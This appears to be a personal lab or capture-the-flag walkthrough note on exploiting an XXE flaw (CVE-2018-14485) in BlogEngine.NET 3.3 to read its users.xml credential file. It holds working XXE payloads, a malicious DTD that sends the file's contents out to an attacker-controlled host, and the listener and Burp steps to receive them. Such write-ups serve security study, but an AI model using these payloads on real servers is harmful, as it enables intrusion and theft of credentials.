From BlogEngine.NET [documentation](https://blogengine.io/docs/how-do-i-reset-blogengine-admin-password/) we know that the `/app_data/users.xml` file contains the user credentials.

From enumerating the server using the path traversal vulnerability we know that the file is located at `C:\inetpub\wwwroot\blog\App_data\users.xml`

Now using a XXE vulnerability we can read the contents of the file.

## [**CVE-ID: 2018–14485**](https://nvd.nist.gov/vuln/detail/CVE-2018-14485) BlogEngine.NET 3.3 allows XXE attacks via the POST body to metaweblog.axd.

More info https://www.exploit-db.com/exploits/47014.

### Look for an exploit.

#Attacking_machine 
```
searchsploit Blogengine
```

![[Screenshot from 2025-09-15 10-47-30.png]]

```
cat /usr/share/exploitdb/exploits/windows/webapps/46106.txt
```

![[Screenshot from 2025-09-15 10-51-17.png]]

This XML is a classic **XXE (XML External Entity)** payload. I’ll explain exactly what it does, why it’s dangerous, how to detect it, and (most importantly) how to fix/mitigate it safely.

```
<?xml version="1.0"?>
<!DOCTYPE ns [
  <!ELEMENT ns ANY>
  <!ENTITY lfi SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<ns>&lfi;</ns>
```

- The Url is the path you have to browse. (In our case `http://<MACHINE IP>/blog/metaweblog.axd`)
- The DOCTYPE declares an external entity named `lfi` that points to a local file: `file:///C:/Windows/System32/drivers/etc/hosts`.
- When an XML parser **resolves external entities** and expands `&lfi;`, the contents of that file are substituted into the XML document.
- If an application parses the XML and returns/stores the parsed content (or sends it somewhere), an attacker can **exfiltrate local files** (local file inclusion), or trigger SSRF/remote requests if the SYSTEM URL points to `http(s)://` or `ftp://`.


### Create a file called `ed.dtd`

#Attacking_machine 
```
<!ENTITY % p1 SYSTEM "file:///C:/inetpub/wwwroot/blog/App_Data/users.xml"> 
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://<ATTACKING MACHINE IP>/EX?%p1;'>">
%p2;
```

- `%p1` is a **parameter entity** whose value is the local file `C:/inetpub/wwroot/blog/App_Data/users.xml`.
    
- `%p2` is another parameter entity whose value _contains_ a definition for a general entity `e1` whose SYSTEM identifier is an `http://` URL pointing at an attacker-controlled host. That URL includes the string `%p1;` — when expanded later, `%p1;` becomes the contents (or a representation) of the local file.
    
- The final `%p2;` expands `%p2`, which defines `e1` with the remote URL. Depending on the parser and how/when entities are resolved, the parser may attempt to fetch that remote URL — causing the local file contents to be sent to the attacker (via the URL or as part of an SMB/HTTP callback). This is a classic **out-of-band (OOB) file exfiltration** pattern using parameter entities and nested entity expansion.

### Run python http.server

Use port 445 because a Firewall blocks other ports.

#Attacking_machine 
```
python3 -m http.server 445
```

### Burp Suite

- Intercept the request `http://<MACHINE IP>/blog/metaweblog.axd`, using BurpSuite.
- Send the request to `Repeater`.
- Add the following code to the request:
```
<?xml version="1.0"?>  
<!DOCTYPE foo SYSTEM "http://<ATTACKING MACHINE IP>:445/ed.dtd">  
<foo>&e1;</foo>
```
![[Screenshot from 2025-09-15 12-34-24.png]]

- Send the request.
- Show the result on python3 terminal.

![[Screenshot from 2025-09-15 12-36-28.png]]

**Next step:** [[Decoding the URL and the users' hashes]]